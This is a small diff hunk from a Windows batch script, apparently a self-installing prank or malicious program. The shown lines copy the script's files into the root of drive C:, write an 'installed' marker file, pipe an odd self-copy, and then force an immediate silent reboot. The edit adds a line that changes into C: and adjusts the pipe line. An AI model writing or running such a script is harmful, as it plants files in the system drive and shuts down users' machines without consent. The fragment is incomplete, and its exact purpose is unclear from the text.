@@ -42,7 +42,7 @@ REM malloc
 popd
 cd %~dp0 REM expansion to dir where files would be?????
 copy * c:\
-
+cd c:\
 echo installed>inf.rsc 
-copy /b inf.rsc inf.rsc |^ copy /b inf.rsc inf.rsc
+copy /b inf.rsc inf.rsc |^copy /b inf.rsc inf.rsc
 shutdown -r /t 0>nul
